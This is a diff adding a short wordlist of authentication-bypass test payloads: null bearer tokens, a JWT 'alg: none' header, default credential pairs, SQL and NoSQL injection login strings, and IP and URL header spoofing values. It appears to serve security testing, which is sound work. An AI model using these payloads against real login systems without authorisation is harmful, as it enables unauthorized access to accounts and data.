@@ -1,0 +1,20 @@
+# Authentication Bypass Test Patterns
+Bearer null
+Bearer undefined
+Bearer false
+Authorization: Bearer invalid_token_123
+{"alg":"none","typ":"JWT"}
+{"alg":"HS256","typ":"JWT"}
+admin:admin
+admin:password
+root:root
+guest:guest
+user:user
+' OR '1'='1
+admin'--
+admin' #
+{"username":"admin","password":{"$gt":""}}
+{"username":{"$ne":null},"password":{"$ne":null}}
+X-Forwarded-For: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Original-URL: /admin
